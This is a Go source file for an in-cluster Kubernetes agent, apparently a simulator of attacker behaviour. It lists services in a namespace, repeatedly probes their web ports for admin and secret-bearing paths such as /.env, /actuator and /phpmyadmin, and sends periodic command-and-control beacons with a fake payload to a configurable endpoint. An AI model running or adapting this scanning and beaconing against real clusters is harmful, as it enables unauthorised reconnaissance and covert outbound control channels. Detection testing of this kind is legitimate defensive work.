package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

// Store represents our in-memory K/V store
type Store struct {
	sync.RWMutex
	data map[string]interface{}
}

// NewStore creates a new Store instance
func NewStore() *Store {
	return &Store{
		data: make(map[string]interface{}),
	}
}

var store = NewStore()
var scannedServices = make(map[string]string) // Map service name to IP

// Common admin endpoints to probe
var adminEndpoints = []string{
	"/admin",
	"/administrator",
	"/wp-admin",
	"/dashboard",
	"/management",
	"/console",
	"/actuator",
	"/metrics",
	"/api",
	"/api/v1",
	"/api/v2",
	"/swagger",
	"/swagger-ui",
	"/swagger-ui.html",
	"/graphql",
	"/graphiql",
	"/debug",
	"/status",
	"/health",
	"/info",
	"/env",
	"/config",
	"/prometheus",
	"/monitoring",
	"/jenkins",
	"/phpmyadmin",
	"/adminer",
	"/server-status",
	"/.env",
	"/login",
}

func probeService(url string) {
	client := &http.Client{
		Timeout: 2 * time.Second,
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		endpoint := adminEndpoints[rand.Intn(len(adminEndpoints))]
		fullURL := fmt.Sprintf("http://%s%s", url, endpoint)

		resp, err := client.Get(fullURL)
		if err != nil {
			log.Printf("evil request failed to %s: %v", fullURL, err)
			continue
		}
		defer resp.Body.Close()
		log.Printf("evil request succeeded to %s", fullURL)

		// Store interesting responses (non 404s)
		if resp.StatusCode != 404 {
			key := fmt.Sprintf("probe_%s%s", url, endpoint)
			store.Lock()
			store.data[key] = resp.StatusCode
			store.Unlock()
			log.Printf("Interesting endpoint found: %s (Status: %d)", fullURL, resp.StatusCode)
		}
	}
}

func checkK8sServices(clientset *kubernetes.Clientset, targetNS string) {
	services, err := clientset.CoreV1().Services(targetNS).List(context.Background(), metav1.ListOptions{})
	if err != nil {
		log.Printf("Error listing services: %v", err)
		return
	}

	fmt.Printf("\nServices in namespace %s:\n", targetNS)
	for _, svc := range services.Items {
		// Check if service IP has changed
		if ip, exists := scannedServices[svc.Name]; !exists || ip != svc.Spec.ClusterIP {
			fmt.Printf("- %s\n", svc.Name)
			fmt.Printf("  Type: %s\n", svc.Spec.Type)
			fmt.Printf("  ClusterIP: %s\n", svc.Spec.ClusterIP)
			if len(svc.Spec.Ports) > 0 && svc.Name != "kubernetes" {
				fmt.Printf("  Ports:\n")
				for _, port := range svc.Spec.Ports {
					fmt.Printf("    - %d/%s\n", port.Port, port.Protocol)

					if (port.Port == 80 || port.Port == 443 || port.Port == 8080) && port.Protocol == "TCP" {
						serviceURL := fmt.Sprintf("%s:%d", svc.Spec.ClusterIP, port.Port)
						go probeService(serviceURL)
						scannedServices[svc.Name] = svc.Spec.ClusterIP
					}
				}
			}
		}
	}
}

func sendC2Beacon(endpoint string) {
	// Create fake C2 payload
	payload := map[string]interface{}{
		"hostname":  fmt.Sprintf("compromised-pod-%d", time.Now().Unix()%100),
		"ip":        fmt.Sprintf("10.%d.%d.%d", time.Now().Unix()%255, time.Now().Unix()%255, time.Now().Unix()%255),
		"timestamp": time.Now().Unix(),
		"data":      "no_data",
	}

	// Convert to JSON
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		log.Printf("Failed to marshal JSON payload: %v", err)
		return
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Send POST request
	_, err = client.Post(endpoint, "application/json", bytes.NewReader(jsonPayload))
	if err != nil {
		log.Printf("evil request failed to C2 endpoint %s: %v", endpoint, err)
		return
	}
	log.Printf("evil request succeeded to C2 endpoint %s", endpoint)
}

func main() {
	rand.Seed(time.Now().UnixNano())

	c2Endpoint := os.Getenv("C2_ENDPOINT")
	c2Interval := os.Getenv("C2_INTERVAL")
	targetNS := os.Getenv("TARGET_NS")
	if targetNS == "" {
		log.Fatal("TARGET_NS environment variable must be set")
	}

	config, err := rest.InClusterConfig()
	if err != nil {
		log.Fatalf("Failed to create in-cluster config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		log.Fatalf("Failed to create clientset: %v", err)
	}

	// Run k8s service check every 10 seconds
	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()

		for range ticker.C {
			checkK8sServices(clientset, targetNS)
		}
	}()

	// Run C2 beacon if configured
	if c2Endpoint != "" {
		interval := 60 * time.Second // Default 60s
		if c2Interval != "" {
			if d, err := time.ParseDuration(c2Interval); err == nil {
				interval = d
			}
		}

		go func() {
			ticker := time.NewTicker(interval)
			defer ticker.Stop()

			for range ticker.C {
				sendC2Beacon(c2Endpoint)
			}
		}()
	}

	select {}
}
